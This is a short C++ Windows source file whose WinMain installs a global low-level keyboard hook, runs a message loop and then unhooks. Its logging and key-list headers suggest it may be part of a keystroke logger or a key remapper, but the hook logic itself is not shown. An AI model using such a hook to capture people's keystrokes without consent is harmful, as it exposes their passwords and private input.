#include "Hooking.h"
#include "KeyList.h"
#include "KeyboardHooking.h"
#include "Logging.h"
#include "SpecialKeys.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	std::map<UINT, UINT> key_list;
	KeyList::SetDefaultKeyList(key_list);
	// sets hook
	// if using low-level keyboard hooking (WH_KEYBOARD_LL) there is no need to use DLL
	HHOOK keyboard_hook;
	keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHooking::HookProc, hInstance, 0);
    KeyboardHooking::MsgLoop(); //prevents from closing
    UnhookWindowsHookEx(keyboard_hook); //unhooks
    return 0;
}
